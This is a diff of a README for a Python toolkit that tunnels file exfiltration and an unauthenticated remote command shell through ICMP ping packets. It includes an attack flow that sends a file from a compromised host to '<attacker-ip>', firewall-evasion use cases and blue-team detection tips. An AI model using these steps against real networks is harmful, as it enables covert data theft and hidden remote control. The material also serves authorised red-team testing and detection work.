@@ -1,106 +1,71 @@
-# ping0-exfil
+ICMP Toolkit - ping0-exfil
 
-Here’s a professional and complete `README.md` tailored for GitHub that explains how this ICMP-based file transfer tool can be used for **data exfiltration**, especially in **Red Team** and **penetration testing** scenarios.
+This repository contains a suite of tools for transferring files and executing remote commands over the ICMP (Internet Control Message Protocol). These tools utilize raw sockets to tunnel data within standard ICMP echo requests and replies, allowing for communication in environments where traditional TCP/UDP ports may be restricted.
+Project Overview
 
----
+The project is divided into two main functional systems:
 
-```
-# 🛠️ ICMP File Transfer Toolkit — `ping-exfil`
+    File Transfer System: For covertly exfiltrating or moving files.
 
-A cross-platform file exfiltration tool that transfers data covertly using ICMP echo request ("ping") packets. Works on both **Windows and Linux**. The toolkit includes two components:
+    Remote Command Execution System: For running shell commands and receiving output via ICMP.
 
-- **`client.py`** — Sends a file to a target over raw ICMP.
-- **`server.py`** — Listens for and reconstructs the file from incoming ICMP packets.
+Requirements
 
-> 📢 **For Educational and Red Team Use Only**  
-> Do not deploy this tool without explicit permission. ICMP-based exfiltration techniques are often used in **covert channels** and may bypass traditional firewalls and network inspection tools.
+    Python 3.x
 
----
+    Root or Administrator privileges (required to open raw sockets for ICMP)
 
-## 📦 Features
+    Supported Platforms: Linux, Windows, macOS
 
-- 🛰️ **Protocolless Exfiltration** – Works via raw ICMP echo request packets; does not use TCP or UDP.
-- 🧩 **Chunked Transfer** – Files are split into verifiable chunks (with SHA-256 hashes) to maintain integrity.
-- ✅ **Checksum Validation** – Ensures complete file and chunk integrity on the receiver side.
-- 💻 **Cross-Platform Support** – Works on Linux and Windows (requires admin/root).
-- 🔐 **Firewall Evasion Potential** – Mimics normal ping traffic, which is often permitted even on restricted networks.
+Components
+1. File Transfer System
 
----
+This system handles chunk-by-chunk file transmission with SHA-256 integrity verification.
 
-## 🚀 Use Cases in Red Teaming
+    server.py: The receiver script. It listens for ICMP packets with the FILEXFER signature, assembles file chunks in order, and verifies the final file hash.
 
-| Scenario | Description |
-|---------|-------------|
-| 🧱 **Bypass Egress Filters** | Many corporate firewalls allow ICMP for diagnostics. This tool sneaks data out without opening TCP/UDP ports. |
-| 🕵️ **Covert Data Theft** | Transfers sensitive files (e.g., credentials, documents) back to a command-and-control (C2) server using standard ping traffic. |
-| 🧪 **Network Detection Testing** | Test how well IDS/IPS or SIEM tools can detect abnormal ICMP traffic and payloads. |
-| 🐚 **Staging Payloads** | Transfer binary payloads to a foothold machine without raising HTTP/DNS traffic. |
+    client.py: The sender script. It reads a local file, splits it into chunks, calculates hashes, and transmits them to the target IP.
 
----
+2. Remote Command Execution System
 
-## 🧪 Example Attack Flow
+This system allows for a "ping-based" shell where commands are sent in echo requests and results are returned in echo replies.
 
-1. ✅ **Attacker Setup**  
-   Run the ICMP listener (`server.py`) on a remote machine with a public or reachable internal IP:
-   ```
-   sudo python3 server.py
-   ```
+    executor.py: The listener script (server). It waits for ICMP packets containing a command signature, executes the command on the local system using a shell, and sends the stdout/stderr back in the ICMP reply.
 
-2. 📤 **Victim Exfiltration**  
-   On the compromised host:
-   ```
-   sudo python3 client.py <attacker-ip>
-   ```
-   The script will ask:
-   ```
-   Enter path of file to send:
-   ```
+    execute.py: The controller script (client). It sends a specific command to a target IP and waits to capture and display the returned output from the ICMP reply.
 
-3. 💾 **Server Reconstructs File**  
-   The listener validates all chunks, verifies the full SHA-256 hash, and writes the reassembled file with the original filename.
+Usage Instructions
+File Transfer
 
----
+To receive a file: sudo python3 server.py
 
-## 📁 File Transfer Protocol Design
+To send a file: sudo python3 client.py <target_ip> <path_to_file>
+Remote Command Execution
 
-Each ICMP Echo Request payload includes:
-- `FILEXFER` (8 bytes) – Protocol signature.
-- `Type` (1 byte) – Start (0), Chunk (1), End (2).
-- `Chunk #` (2 bytes) – Packet index.
-- `Hash` (32 bytes) – SHA-256 of the chunk.
-- `Payload` – Either filename, file chunk, or final hash.
+To start the listener on the target machine: sudo python3 executor.py
 
-The receiver reassembles chunks in order, verifies the full hash, and saves the result.
+To execute a command from the controller machine: sudo python3 execute.py <target_ip> "your_command_here"
+Protocol Details
 
----
+The tools use a custom header prepended to the ICMP payload:
 
-## ⚠️ Limitations
+    Signature: A unique string (e.g., FILEXFER or RUN_CMD) used to identify project packets.
 
-- ❗ Must be run with root/admin permissions.
-- 🐢 Slower than TCP transfers due to ICMP rate limits.
-- 🔍 Detectable by deep packet inspection (DPI) if not obfuscated.
-- 🔒 May be blocked by hardened security environments or cloud systems.
+    Type/Command: Identifies if the packet is a start, data chunk, end, or command execution request.
 
----
+    Metadata: Includes chunk numbers and SHA-256 hashes for integrity and ordering.
 
-## 🛡️ Detection & Prevention Tips
+Security Considerations
 
-> For blue teams looking to detect such behavior:
+    No Encryption: By default, the data is sent in cleartext within the ICMP payload. It can be inspected by packet sniffers like Wireshark.
 
-- Monitor **ICMP echo requests with unusually large payloads**.
-- Set up alerts for **frequent pings with non-standard sizes**.
-- Use **packet inspection tools** (e.g., Suricata, Zeek) to flag ICMP anomalies.
-- Block or rate-limit outbound ICMP traffic where not necessary.
+    No Authentication: The current version of the command executor does not require a password. Anyone who knows the packet signature can execute commands on the listener.
 
+    Detection: While ICMP traffic is often allowed, high-frequency pings or large ICMP payloads may be flagged by Intrusion Detection Systems (IDS).
 
+Disclaimer
 
-## 🧰 Dependencies
+This toolkit is intended for educational purposes, authorized security testing, and Red Team engagements only. Unauthorized use of these tools against systems you do not have explicit permission to test is illegal and unethical. The authors are not responsible for any misuse or damage caused by this software.
+License
 
-Only uses Python’s standard library (no pip dependencies):
-- `socket`
-- `struct`
-- `hashlib`
-- `os`, `sys`
-
-
-
+This project is licensed under the MIT License. See the LICENSE file for details.
